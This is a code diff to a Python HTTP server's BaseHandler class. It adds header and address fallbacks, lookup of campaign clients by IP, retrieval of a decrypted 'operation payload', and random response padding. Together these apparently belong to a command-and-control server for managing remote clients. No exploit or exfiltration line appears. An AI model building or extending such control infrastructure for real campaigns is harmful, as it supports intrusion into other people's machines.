@@ -23,8 +23,21 @@ class BaseHandler:
         self.crypto_helper = crypto_helper
         self.client_helper = client_helper
         self.path_router = path_router
-        self.client_address = request_handler.client_address
-        self.headers = request_handler.headers
+        
+        # Access client_address directly from the handler
+        # This attribute should be available since do_GET/do_POST is called after setup
+        self.client_address = getattr(request_handler, 'client_address', ('Unknown', 0))
+        
+        # Get headers and server from request_handler if available
+        if hasattr(request_handler, 'headers'):
+            self.headers = request_handler.headers
+        else:
+            # Create a dummy headers object if not available
+            class DummyHeaders:
+                def get(self, name, default=None):
+                    return default
+            self.headers = DummyHeaders()
+            
         self.server = request_handler.server
         
     def log_message(self, message):
@@ -84,12 +97,30 @@ class BaseHandler:
         
         return f"{campaign_name}_campaign"
     
-    def identify_client(self):
-        """
-        Identify client through decryption
-        
-        This is a placeholder that should be overridden by handlers 
-        that need to identify clients through key-based decryption
-        """
-        # This will be implemented by specific handlers
+    def get_operation_payload(self):
+        """Get the operation payload from the decrypted data"""
+        if hasattr(self.request_handler, 'decrypted_payload'):
+            return self.request_handler.decrypted_payload
         return None
+    
+    def _identify_client_by_ip(self):
+        """Identify client based on IP address as fallback"""
+        client_ip = self.client_address[0]
+        for client_id, client_info in self.client_manager.get_clients_info().items():
+            if client_info.get('ip') == client_ip:
+                return client_id
+        return None
+
+    def _generate_token_padding(self):
+        """Generate random token padding for responses"""
+        import random
+        import string
+        
+        # Generate a random length between 50 and 500 characters
+        padding_length = random.randint(50, 500)
+        
+        # Generate random padding content
+        chars = string.ascii_letters + string.digits
+        padding = ''.join(random.choice(chars) for _ in range(padding_length))
+        
+        return padding
